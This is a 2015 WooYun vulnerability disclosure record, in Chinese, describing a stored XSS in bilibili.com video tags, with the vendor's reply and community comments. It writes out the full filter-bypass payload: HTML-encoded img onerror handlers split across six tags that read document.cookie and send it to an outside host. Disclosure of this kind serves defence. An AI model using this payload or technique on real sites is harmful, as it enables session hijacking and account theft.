{"id": 71610, "wybug_id": "wooyun-2015-0146855", "wybug_title": "bilibili主站存在存储型XSS漏洞（艰辛的绕过过程/成功传cookie至域外）", "wybug_corp": "bilibili.com", "wybug_author": "端端", "wybug_date": "2015-10-15 11:11", "wybug_open_date": "2015-12-03 17:20", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向公众公开  简要描述： bilibili主站存在存储型XSS漏洞（艰辛的绕过过程）问题其实有点鸡肋，包括有部分关键字过滤、长度的限制以及被强制转换为大写字母等，但终究还是把cookie传到了域外 详细说明：  出现问题的地方是视频下方的标签任何一个视频最多可以有10个标签显示，且标签开放编辑\n\n测试时发现没有进行转义直接按照html输出到了页面导致标签被浏览器解释\n\n添加标签发现超过20个字符会有提示\n\n但并没有请求发出，所以是前端的限制，直接调用接口（http://www.bilibili.com/api_proxy?app=tag&action=/tags/archive_add）测试确认后端限制60个字符并且会将所有小写字母替换为大写字母接口本身虽然也做了一些过滤（比如\"<script\"之类的）但并不全面\n\n通过测试发现\n<img src=\"\"onerror =SOME_JS_CODE>\n是有效的（onerror和=之间必须有空格否则接口会403错误）由于javascript是大小写敏感的，所以直接写入含有小写字母的代码是不可以的测试发现通过HTML编码可以绕过这一问题即\n<img src=\"\"onerror =alert(0)>\n变为\n<img src=\"\"onerror =&#97&#108&#101&#114&#116(0)>\n （非小写字母没必要编码，节省空间）\n\n但就算这样很明显要想把cookie顺利传到站外，仅仅60个字符是不够的但不要忘记，我们最多可以添加10个标签，那么在这10个标签中是否可以做到呢答案是可以的（这不废话吗(-__-)b）分别执行以下脚本（这里字符串拆分是因为编码后太长了，奇怪的写法都是为了缩短单个标签里的长度）\nA='ocumen'B='t';F=Imageeval('C=d'+A+B)D=C.cookieE=new F()E.src='//WOOYUN.ORG/?'+D\n构造标签内容如下，直接使用接口按顺序添加至视频标签\n<img src=\"\"onerror =A='&#111&#99&#117&#109&#101&#110'><img src=\"\"onerror =B='&#116';F=I&#109&#97&#103&#101><img src=\"\"onerror =&#101&#118&#97&#108('C=&#100'+A+B)><img src=\"\"onerror =D=C.&#99&#111&#111&#107&#105&#101><img src=\"\"onerror =\"E=&#110&#101&#119 F()\"><img src=\"\"onerror =E.&#115&#114&#99='//WOOYUN.ORG/?'+D>\n像这样添加\n\n6个都添加完后（那个点赞的小手颜色有点浅，我觉得在有些显示器上看不太清，就知道红圈里有6个点赞的小手就好了(-__-)b）\n\n   漏洞证明：  测试地址顺便提一句，我只是随便找了一个视频……那个视频不是我传的。\nhttp://www.bilibili.com/video/av2546682/\n我不知道审核之前会不会被发现，还没被发现的话可以看下效果会产生一个目标至wooyun.org的请求，其中GET参数是当前在bilibili的cookie我测试时的截图如下（测试过程均在登录另外的账号下进行，以避免未知的可能存在的影响因素）\n\n视频标签处的惨状\n\nIE11下测试\n\n   修复方案：  1、输出时转义2、输入时过滤   版权声明：转载请注明来源 端端@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-10-19 17:19 厂商回复： ~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-15 11:14 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:25        | 开发真是日了狗了)\t\t \n  比利：洞主，♂乖乖站好♂    \n     2015-10-15 11:16 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1302 漏洞数:332        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  好鬼畜的xss    \n     2015-10-15 11:31 |    \t\t染血の雪 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:30        | 击缻)\t\t \n  洞主关注B站30年    \n     2015-10-15 12:43 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:16        | ☭)\t\t \n  哲学 http://www.bilibili.com/video/av2662415/    \n     2015-10-15 13:41 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  up主好厉害~~    \n     2015-10-15 15:16 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | 你猜)\t\t \n  up主我要塞你硬币    \n     2015-10-15 16:00 |    \t\tXmyth_Xi2oMin9 \t\t\t( 普通白帽子  |\t\t\t        Rank:400 漏洞数:56        | 人来人往 喜欢却只能欣赏 再见了各位)\t\t \n  哔，学生卡。    \n     2015-10-15 16:04 |    \t\t聋子 \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:69        | 一个聋子)\t\t \n  妮可妮可妮~    \n     2015-10-15 16:52 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1317 漏洞数:193        | 。)\t\t \n  up主好叼 处女币已投！    \n     2015-10-15 18:24 |    \t\txtnnd \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:45        | t-safe)\t\t \n  被币淹没 不知所错    \n     2015-10-22 00:11 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Up)\t\t \n  FA♂Q    \n     2015-10-27 21:53 |    \t\tSecurity \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:12        )\t\t \n  我隐约知道是什么了。    \n     2015-11-09 09:32 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  chrome的插件是啥    \n     2015-11-09 14:33 |    \t\t端端 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:19        | niconiconi~)\t\t \n  @牛肉包子 你说哪个    \n     2015-11-09 17:07 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @端端 发包的那个    \n     2015-11-09 17:57 |    \t\t端端 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:19        | niconiconi~)\t\t \n  @牛肉包子 Postman - REST Clienthttps://chrome.google.com/webstore/detail/postman-rest-client/fdmmgilgnpjigdojojpjoooidkmcomcm    \n     2015-11-09 18:17 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @端端 thx    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}